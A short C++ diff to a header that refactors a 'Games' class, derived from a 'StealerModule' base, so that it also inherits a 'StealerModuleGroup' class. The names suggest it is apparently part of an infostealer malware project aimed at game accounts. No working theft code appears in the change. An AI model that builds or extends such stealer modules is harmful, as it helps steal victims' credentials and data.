@@ -7,14 +7,12 @@
 
 
 #include "../../StealerModule.h"
-#include <thread>
+#include "../../StealerModuleGroup.h"
 
-class Games : public StealerModule {
+class Games : public StealerModule, StealerModuleGroup {
 public:
     Games();
     void execute(fs::path &root) override;
-private:
-    std::list<StealerModule*> modules;
 };
 
 
